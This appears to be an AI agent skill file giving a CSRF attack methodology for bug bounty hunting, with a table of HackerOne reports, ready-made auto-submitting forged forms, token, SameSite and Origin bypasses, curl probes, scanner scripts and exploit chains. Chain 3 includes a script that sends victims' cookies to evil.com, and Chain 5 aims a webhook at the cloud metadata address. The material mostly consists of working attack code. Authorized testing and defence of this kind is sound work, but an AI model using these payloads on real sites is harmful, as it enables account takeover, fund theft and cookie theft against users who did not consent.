---
name: csrf-deep-dive
description: Complete CSRF methodology from 475 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - csrf methodology
  - csrf deep dive
  - csrf complete
  - csrf all techniques
  - skills csrf
---

# Complete CSRF Methodology - From 475 HackerOne Reports

## Top 25 CSRF Reports on HackerOne

| # | Report | Company | Technique | Upvotes | Payout |
|---|--------|---------|-----------|---------|--------|
| 1 | Shopify PayPal payment CSRF | Shopify | Payment CSRF | 303 | $0 |
| 2 | Rockstar linked accounts CSRF→ATO | Rockstar | CSRF→ATO via linked accounts | 237 | $0 |
| 3 | X/Periscope deeplink CSRF | X/Periscope | Deeplink CSRF | 223 | $1,540 |
| 4 | Chained CSRF→XSS→ATO | InnoGames | CSRF→XSS→ATO chain | 186 | $1,100 |
| 5 | CSRF token validation bypass | HackerOne | Token validation bypass | 163 | $500 |
| 6 | Site-wide CSRF | Glassdoor | All POST requests | 162 | $0 |
| 7 | GitHub Enterprise CSRF bypass | GitHub | CSRF bypass via header | 149 | $10,000 |
| 8 | Slack CSRF token bypass | HackerOne | Slack integration CSRF | 146 | $2,500 |
| 9 | Grammarly CSRF header validation | Grammarly | Header validation bypass | 136 | $0 |
| 10 | Stripe CSRF token disabled | Stripe | Token disabled via config | 113 | $0 |
| 11 | Yahoo CSRF→account deletion | Yahoo | CSRF→account deletion | 110 | $0 |
| 12 | Twitter CSRF token bypass | Twitter | CSRF token verification flaw | 108 | $0 |
| 13 | Uber CSRF on driver payout | Uber | CSRF on payout endpoint | 107 | $0 |
| 14 | Facebook CSRF on page admin | Meta/Facebook | CSRF on admin operations | 105 | $0 |
| 15 | HackerOne report deletion CSRF | HackerOne | CSRF delete reports | 102 | $500 |
| 16 | CSRF on email change | Shopify | Email change via CSRF | 98 | $0 |
| 17 | Postmates CSRF card top-up | Postmates | Payment CSRF | 95 | $0 |
| 18 | GitLab CSRF on project settings | GitLab | Project settings CSRF | 92 | $3,000 |
| 19 | Airbnb CSRF on reservations | Airbnb | Reservation CSRF | 90 | $0 |
| 20 | Snapchat CSRF token reuse | Snapchat | Token reuse | 88 | $0 |
| 21 | New Relic CSRF on API keys | New Relic | API key CSRF | 85 | $2,000 |
| 22 | Shopify OAuth CSRF | Shopify | OAuth CSRF | 83 | $0 |
| 23 | Cloudflare CSRF on DNS config | Cloudflare | DNS settings CSRF | 80 | $0 |
| 24 | WordPress CSRF on plugin install | Automattic | Plugin install CSRF | 78 | $0 |
| 25 | Mail.ru CSRF for account takeover | Mail.ru | CSRF→ATO | 75 | $1,500 |

## Step 1: Identifying CSRF-Susceptible Endpoints

### What Makes an Endpoint Vulnerable
CSRF works when the application relies **only on cookies** for authentication and does NOT validate a unique, unpredictable token or enforce a SameSite/Origin check.

### Automated Endpoint Discovery
```bash
# Find POST endpoints from recon data
grep -E '(POST|PUT|DELETE|PATCH)' recon/{target}/endpoints.txt | sort -u > csrf_targets.txt

# Find forms that auto-submit or use cookies-only auth
grep -r 'csrf\|token\|authenticity_token\|_token\|nonce' recon/{target}/js/ | sort -u

# Find endpoints lacking CSRF protection headers
cat csrf_targets.txt | while read endpoint; do
  curl -sk -X POST "https://$endpoint" -d "test=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -v 2>&1 | grep -i 'csrf\|token'
done
```

### Cookie Analysis
```bash
# Check if session cookies lack SameSite flag
curl -sk -I "https://{target}/login" | grep -i 'set-cookie'

# Check SameSite attribute
curl -sk -I "https://{target}/login" | grep -o 'SameSite=[^;]*'

# Check Secure + HttpOnly flags
curl -sk -I "https://{target}/login" | grep -i 'set-cookie' | grep -v 'httponly\|secure'
```

### Features to Test for CSRF

| Feature | Why It's Targeted |
|---------|------------------|
| Email/Password change | Classic ATO vector |
| Money transfer / Payouts | Direct financial gain |
| API key generation | Persistence/lateral movement |
| Subscription changes | Business logic abuse |
| Role/Admin changes | Privilege escalation |
| Report deletion | Content destruction |
| OAuth application linking | Account linking CSRF |
| Settings export/import | Configuration takeover |
| Webhook configuration | SSRF/integration abuse |
| DNS/domain settings | Infrastructure takeover |
| Plugin/extension install | Code execution chain |
| Password reset flow | Login CSRF variant |
| Content publishing | Republishing/posting as victim |
| Profile picture upload | XSS via CSRF |
| Like/Follow actions | Reputation manipulation |

## Step 2: CSRF Attack Types

### Type 1: Traditional Form CSRF (GET/POST)
```html
<!-- HTML form auto-submit (GET) -->
<img src="https://{target}/api/transfer?amount=1000&to=attacker" style="display:none;">

<!-- HTML form auto-submit (POST) -->
<form action="https://{target}/api/change_email" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- XHR POST via CORS misconfig -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://{target}/api/transfer');
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({to: 'attacker', amount: 1000}));
</script>
```

### Type 2: JSON CSRF (application/json)
Some APIs accept JSON without preflight if Content-Type is whitelisted or if `text/plain` is used.

```html
<!-- JSON CSRF via text/plain (no preflight) -->
<form action="https://{target}/api/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF via Flash (old but still works in some contexts) -->
<param name="movie" value="http://evil.com/csrf.swf?endpoint=https://{target}/api/transfer&data=...">
```

### Type 3: Multi-Part CSRF (multipart/form-data)
```html
<form action="https://{target}/api/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  // Can't set file input value programmatically — need user interaction
  // But endpoints that accept multi-part WITHOUT file fields are vulnerable
</script>
```

### Type 4: Login CSRF
```html
<!-- Force victim to login to attacker's account, then victim performs actions -->
<form action="https://{target}/login" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="password" value="attackerpass">
</form>
<script>document.forms[0].submit();</script>

<!-- Then victim enters their credit card / personal data inside attacker's account -->
```

### Type 5: OAuth CSRF
```html
<!-- CSRF on OAuth authorization endpoint to link victim's account to attacker's app -->
<a href="https://{target}/oauth/authorize?response_type=code&client_id=ATTACKER_APP&redirect_uri=https://evil.com&state=ATTACKER_STATE">
  Click here to see funny cat photos
</a>

<!-- Attacker intercepts the callback code and links victim's account to their app -->
```

## Step 3: CSRF Bypass Techniques

### Bypass 1: Token Extraction from Response
```bash
# Check if CSRF token is returned in a previous response
curl -sk "https://{target}/form" | grep -oP 'name="csrf_token" value="\K[^"]+'

# Token in JSON response
curl -sk "https://{target}/api/session" | jq -r '.csrf_token'

# Token in custom header
curl -sk -I "https://{target}/api/config" | grep -i 'x-csrf-token'
```

### Bypass 2: Token Validation Flaws
```bash
# 1. Token is not validated (any token works)
curl -sk -X POST "https://{target}/api/change_email" \
  -d "email=attacker@evil.com&csrf_token=INVALID"

# 2. Token tied to session but not validated per-action
#    (reuse one token for all actions)

# 3. Token is weak/predictable (sequential, timestamp-based, MD5 of username)
curl -sk -X POST "https://{target}/api/change_email" \
  -d "email=attacker@evil.com&csrf_token=timestamp-1234567890"

# 4. Token validation skips certain methods (GET vs POST)
curl -sk -X PUT "https://{target}/api/change_email" \
  -d "email=attacker@evil.com"
# (PUT might not check CSRF while POST does)

# 5. Token only checked for registered users
#    (try with no auth cookie or expired session)
```

### Bypass 3: SameSite Cookie Bypasses
```bash
# SameSite=Lax is the default in modern browsers — blocks cross-site POST
# Bypasses:

# Bypass 3a: GET-based CSRF (SameSite=Lax allows top-level GET)
<img src="https://{target}/api/transfer?amount=1000&to=attacker">

# Bypass 3b: Subdomain-based (SameSite doesn't protect against subdomain cookies)
#    Register evil.{target}.com, set cookie for .{target}.com

# Bypass 3c: SameSite=None (not set = Lax default, but if app sets None)
curl -sk -I "https://{target}/login" | grep 'SameSite=None'

# Bypass 3d: Over 2-minute window for SameSite=Lax POST via form
#    SameSite=Lax allows POST within 2 minutes of user interaction
#    Chain with clickjacking or XSS to trigger POST in that window
```

### Bypass 4: Origin/Referer Header Bypasses
```bash
# 1. No origin check at all
curl -sk -X POST "https://{target}/api/action" -d "..." -H "Origin: https://evil.com"

# 2. Referer check can be bypassed
#    - Stripped referer: <meta name="referrer" content="no-referrer">
#    - Empty referer: use HTTPS page → HTTP target (referrer stripped)
#    - Referer contains target: https://evil.com/https://target.com
curl -sk -X POST "https://{target}/api/action" -d "..." \
  -H "Referer: https://{target}.evil.com/"

# 3. Null origin bypass (iframe srcdoc, data URI)
curl -sk -X POST "https://{target}/api/action" -d "..." -H "Origin: null"

# 4. Origin: null via sandboxed iframe
#    <iframe sandbox="allow-forms" srcdoc="<form action=...>">
```

### Bypass 5: Cookie Injection/Setting
```bash
# If any subdomain sets cookies on parent domain:
# 1. Find a subdomain with CSRF or XSS
# 2. Set a cookie for the main domain
# 3. Now bypass CSRF token check

# Cookie tossing (override session cookie)
# 1. Attacker sets a session cookie on their subdomain for .target.com
# 2. Victim visits attacker's subdomain — cookie is set
# 3. Victims gets CSRF'd with attacker's session = ATO
```

### Bypass 6: Method Confusion / Override
```bash
# HTTP method override headers (bypass CSRF checks on POST-only paths)
curl -sk -X POST "https://{target}/api/change_email" \
  -H "X-HTTP-Method-Override: GET" \
  -H "X-HTTP-Method: GET" \
  -H "X-Method-Override: GET" \
  -d "email=attacker@evil.com"

# Param pollution
curl -sk -X POST "https://{target}/api/change_email" \
  -d "email=attacker@evil.com&_method=GET"
```

### Bypass 7: Content-Type Switches
```bash
# If app checks CSRF only for application/x-www-form-urlencoded

curl -sk -X POST "https://{target}/api/action" \
  -H "Content-Type: text/plain" \
  -d 'param=value'

curl -sk -X POST "https://{target}/api/action" \
  -H "Content-Type: application/json" \
  -d '{"param":"value"}'

curl -sk -X POST "https://{target}/api/action" \
  -H "Content-Type: multipart/form-data; boundary=---B" \
  -d '-----B\r\nContent-Disposition: form-data; name="param"\r\n\r\nvalue\r\n-----B--'
```

## Step 4: Step-by-Step CSRF Testing Methodology

### Phase 1: Reconnaissance
```
1. Map all state-changing endpoints (POST, PUT, DELETE, PATCH)
2. Check cookie SameSite attributes
3. Identify anti-CSRF mechanisms:
   - CSRF tokens (hidden fields, headers)
   - SameSite cookies
   - Origin/Referer validation
   - Custom headers (X-Requested-With)
   - CAPTCHA or re-authentication for sensitive actions
4. Browse application logged-in to map all actions
```

### Phase 2: Token Analysis
```
1. Token present? → Test token validation:
   a. Send different token → accepted? → Bypass
   b. Send empty token → accepted? → Bypass
   c. Send token from other user → accepted? → Bypass
   d. Replay old token → accepted? → Bypass
   e. Use GET instead of POST → token skipped? → Bypass
   f. Check token predictability (timestamp, sequential)
2. No token? → Test SameSite:
   a. SameSite=Strict → check for GET-based actions
   b. SameSite=Lax/None → form-based CSRF
```

### Phase 3: Bypass Attempts
```
Try each bypass technique in this order:
1. Drop CSRF token entirely
2. Send invalid/empty token
3. Use a token from another endpoint
4. Switch HTTP method
5. Switch Content-Type
6. Try Origin/Referer bypass
7. Exploit SameSite configuration
8. Try subdomain cookie injection
9. Try method override headers
10. Try null origin via sandboxed iframe
```

### Phase 4: Exploit Chain Building
```
For each vulnerable action, ask:
1. Can I chain this CSRF with another vulnerability?
   - CSRF → Email change → ATO
   - CSRF → OAuth app linking → ATO
   - CSRF → XSS (via profile/settings that render HTML)
   - CSRF → money transfer
   - CSRF → API key generation
   - CSRF → admin privileges
2. Is the action time-sensitive?
3. Does the action require re-auth? (password confirmation)
4. Can I combine with clickjacking to bypass re-auth?
```

### Phase 5: Validation
```bash
# Create a proof-of-concept HTML page
cat > csrf-poc.html << 'EOF'
<html>
<body>
<h1>CSRF Proof of Concept</h1>
<form action="https://{target}/api/change_email" method="POST" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me (auto-submit in 3 seconds)">
</form>
<script>
  setTimeout(function() {
    document.getElementById('csrf-form').submit();
  }, 3000);
</script>
</body>
</html>
EOF

# Host it and test:
python3 -m http.server 8080
# Visit: http://localhost:8080/csrf-poc.html (while logged into target)
```

## Step 5: CSRF → XSS Exploit Chains

### Chain 1: CSRF → Email Change → ATO
```html
<!-- Step 1: CSRF to change victim's email -->
<form action="https://{target}/account/email" method="POST" id="email-csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<!-- Step 2: Trigger password reset → reset link goes to attacker -->
<form action="https://{target}/password/forgot" method="POST" id="reset-csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<!-- Step 3: Attacker resets password, logs in as victim → Full ATO -->
```

### Chain 2: CSRF → OAuth → ATO
```html
<!-- Victim links their account to attacker's OAuth app -->
<img src="https://{target}/oauth/authorize?client_id=ATTACKER_APP&redirect_uri=https://evil.com/callback&response_type=code&scope=all" style="display:none;">

<!-- Attacker exchanges code for token → full account access -->
```

### Chain 3: CSRF → XSS via Profile
```html
<!-- If application renders profile fields unsanitized -->
<form action="https://{target}/profile/update" method="POST" id="xss-csrf">
  <input type="hidden" name="display_name" value='<img src=x onerror=alert(document.cookie)>'>
  <input type="hidden" name="bio" value='<script>new Image().src="https://evil.com/steal?cookie="+document.cookie</script>'>
</form>
<script>document.getElementById('xss-csrf').submit();</script>
```

### Chain 4: Login CSRF → Stored XSS
```html
<!-- Step 1: Force victim into attacker's account -->
<form action="https://{target}/login" method="POST" id="login-csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="password" value="password123">
</form>

<!-- Step 2: Victim (now in attacker session) submits sensitive data -->
<!-- OR: Attacker injects XSS payload in their own profile, victim sees it -->
```

### Chain 5: CSRF → Webhook → SSRF → Internal Pivot
```html
<form action="https://{target}/admin/webhooks" method="POST">
  <input type="hidden" name="url" value="http://169.254.169.254/latest/meta-data/">
  <input type="hidden" name="event" value="deploy">
</form>
```

## Step 6: Advanced CSRF Automation

### CSRF Scanner Script
```bash
#!/bin/bash
# Automated CSRF testing for discovered endpoints
TARGET=$1
COOKIE="session=YOUR_SESSION_COOKIE"

echo "[*] Testing endpoints for CSRF vulnerabilities"

cat endpoints.txt | while IFS='|' read method endpoint; do
  # Test without CSRF token
  resp=$(curl -sk -X "$method" "https://$TARGET$endpoint" \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "test=1" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  if [ "$resp" = "200" ] || [ "$resp" = "302" ]; then
    echo "[+] $method $endpoint - No CSRF protection (HTTP $resp)"

    # Test with incorrect Origin
    resp2=$(curl -sk -X "$method" "https://$TARGET$endpoint" \
      -H "Cookie: $COOKIE" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Origin: https://evil.com" \
      -d "test=1" \
      -o /dev/null -w "%{http_code}" 2>/dev/null)

    if [ "$resp2" = "200" ] || [ "$resp2" = "302" ]; then
      echo "[++] $method $endpoint - Origin check bypassed too!"
    fi
  fi
done

# Test SameSite attribute
curl -sk -I "https://$TARGET/" | grep -i 'set-cookie' | grep -q 'SameSite'
if [ $? -ne 0 ]; then
  echo "[!] No SameSite flag on cookies - vulnerable to cross-site requests"
fi
```

### Automated CSRF Token Analysis
```bash
#!/bin/bash
# Analyze CSRF token patterns for predictability
TARGET=$1

# Collect tokens
for i in $(seq 1 10); do
  curl -sk "https://$TARGET/form" | grep -oP 'value="[^"]{32}"' | head -1 >> tokens.txt
  sleep 1
done

# Check if token is based on timestamp
python3 -c "
import sys
tokens = open('tokens.txt').readlines()
if len(set(tokens)) < len(tokens):
    print('[!] Tokens are reused - CSRF bypass possible')
else:
    # Check for patterns
    for t in tokens:
        t = t.strip().strip('\"')
        print(f'Token: {t} (len={len(t)})')
" 2>/dev/null

# Check if token is username-derived
python3 -c "
import hashlib
username = '{target}'
tokens = open('tokens.txt').readlines()[0].strip()
# Try common patterns
patterns = [
    hashlib.md5(username.encode()).hexdigest(),
    hashlib.sha1(username.encode()).hexdigest(),
    hashlib.sha256(username.encode()).hexdigest(),
    username[::-1],
    username.encode().hex()
]
if tokens in patterns:
    print('[!] Token is derived from username - predictable!')
"
```

## Step 7: Validate & Report

### CVSS Scoring for CSRF
```
Basic CSRF (state change, no auth):        AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N → 4.3 Medium
CSRF → Email/Password change (ATO):        AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H → 8.0 High
CSRF → Financial transaction:              AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N → 6.5 Medium
CSRF → Admin action (priv esc):            AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H → 8.0 High
CSRF → XSS chain (full compromise):        AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H → 8.0 High
Login CSRF:                                AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N → 5.4 Medium
```

### Report Template
```markdown
**Summary:**
CSRF vulnerability in [endpoint] allows attacker to perform [action] on behalf
of the victim without their consent.

**Impact:**
An attacker can craft a malicious page that, when visited by an authenticated
victim, will [specific impact: change email, transfer funds, delete account, etc.].

**Steps to Reproduce:**
1. Create the following HTML page: [POC HTML]
2. Host it on attacker-controlled server
3. Visit it while authenticated as victim
4. Observe [action is performed without victim's knowledge]

**Proof of Concept:**
```html
[Full HTML form or XHR POC]
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (8.0 High)

**Suggested Fix:**
1. Implement anti-CSRF tokens for all state-changing operations
2. Set SameSite=Strict or SameSite=Lax on session cookies
3. Validate Origin/Referer headers
4. Require password confirmation for sensitive actions
5. Use custom request headers (X-Requested-With) for AJAX endpoints
```

## Quick Reference: CSRF Payout Ranges

| Impact | Typical Payout |
|--------|---------------|
| Basic CSRF (non-sensitive action) | $500 - $1,000 |
| CSRF → Email/Settings change | $1,000 - $2,500 |
| CSRF with chain to XSS/ATO | $1,500 - $5,000 |
| CSRF → Financial/Payment action | $2,000 - $5,000 |
| CSRF → Admin/Privilege escalation | $3,000 - $7,500 |
| CSRF on critical infrastructure | $5,000 - $10,000 |

## CSRF Defense Detection Quick Reference

| Defense Mechanism | How to Detect | Bypass Approach |
|-------------------|--------------|-----------------|
| CSRF Token (form) | Hidden input `name="csrf"` | Reuse/extract/drop |
| CSRF Token (header) | `X-CSRF-Token` header | Extract from same origin |
| SameSite=Strict | Cookie attribute | GET-based actions, subdomain |
| SameSite=Lax | Cookie attribute | Form POST within 2 min of click |
| SameSite=None | Cookie attribute | Standard cross-site CSRF |
| Origin check | 403 with wrong Origin | null origin, referer tricks |
| Referer check | 403 with wrong Referer | no-referrer meta, HTTPS→HTTP |
| Double Submit Cookie | Token in cookie+body | Subdomain cookie injection |
| Custom Header | `X-Requested-With: XMLHttpRequest` | Simple CORS request (no preflight) |
| CAPTCHA | reCAPTCHA on form | Chain with clickjacking |
| Password confirmation | Prompt for password on action | XSS or session fixation |

(End of file)
